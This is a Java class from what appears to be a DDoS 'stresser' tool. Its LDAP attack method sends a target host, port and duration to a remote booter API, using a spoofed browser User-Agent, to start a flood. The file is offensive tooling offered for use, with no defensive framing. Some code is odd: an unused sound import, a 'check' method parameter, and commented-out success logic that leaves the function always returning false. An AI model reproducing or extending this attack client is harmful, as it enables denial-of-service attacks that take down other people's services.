package org.thesecretintelligence.demonic.stresser.attack.methods;

import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.Scanner;

import javax.sound.sampled.Port;

import org.thesecretintelligence.demonic.api.ApiServer;
import org.thesecretintelligence.demonic.verify.Verify;

public class LDAP {
	
	private static ApiServer server = new ApiServer();
	private static Verify verify = new Verify();
	
	public static boolean sendAttack(String address, String port, int time) {
		
		try {
			server.findServer();
            String url = "http://" + server.domain + "/api.php?key=" + verify.getId() + "&host="+address+"&port="+port+"&time="+time+"&method=check";
            URLConnection openConnection = new URL(url).openConnection();
            openConnection.addRequestProperty("User-Agent",
                    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0");
            @SuppressWarnings("resource")
            Scanner scan = new Scanner(new InputStreamReader(openConnection.getInputStream()));
            while (scan.hasNextLine()) {
                /*
                 * if (scan.nextLine().contains("Attack has been started!")) {
					return true;
				}else {
					return false;
				}
                 */
            	System.out.println(scan.nextLine());
            }
            return false;
        } catch (Exception e) {
        	e.printStackTrace();
        	return false;
        }
		
	}

}
